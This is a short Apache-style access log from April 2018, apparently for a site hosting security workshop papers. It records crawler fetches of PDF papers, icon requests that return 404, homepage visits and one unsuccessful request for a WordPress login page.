137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:50 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:50 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
109.93.91.48 - - [27/Apr/2018:12:09:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:12:09:59 -0400] "GET /2004 HTTP/1.1" 301 4027 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:12:10:01 -0400] "GET /2004/ HTTP/1.1" 200 2109 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:12:10:47 -0400] "GET /2002 HTTP/1.1" 301 4027 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:12:10:48 -0400] "GET /2002/ HTTP/1.1" 200 1763 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [27/Apr/2018:12:10:52 -0400] "GET /papers/2006/nspw2006-porras.pdf HTTP/1.1" 200 157580 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.144 - - [27/Apr/2018:12:10:55 -0400] "GET /papers/2011/nspw2011-wash.pdf HTTP/1.1" 200 538848 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.89 - - [27/Apr/2018:12:11:56 -0400] "GET /papers/1998/nspw1998-slater.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:12:13:01 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
151.42.119.142 - - [27/Apr/2018:12:13:39 -0400] "GET /wp-login.php HTTP/1.1" 404 8034 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
151.42.119.142 - - [27/Apr/2018:12:13:40 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
